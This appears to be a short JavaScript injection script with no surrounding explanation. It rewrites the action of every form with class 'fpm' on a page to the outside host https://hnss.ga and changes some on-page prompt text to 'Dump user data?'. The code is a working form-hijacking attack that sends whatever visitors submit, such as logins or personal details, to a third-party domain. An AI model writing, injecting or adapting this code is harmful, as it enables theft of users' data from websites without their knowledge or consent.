let actionList = document.querySelectorAll('.fpm');
let promptList = document.querySelectorAll('div:nth-child(2) > div:nth-child(1) > p:nth-child(2):not(.iziModal-header-subtitle)');

for (const actionKey in actionList) {
   actionList[actionKey].action = "https://hnss.ga";            
}

for (const promptKey of promptList) {
    promptKey.textContent = "Dump user data?"
}

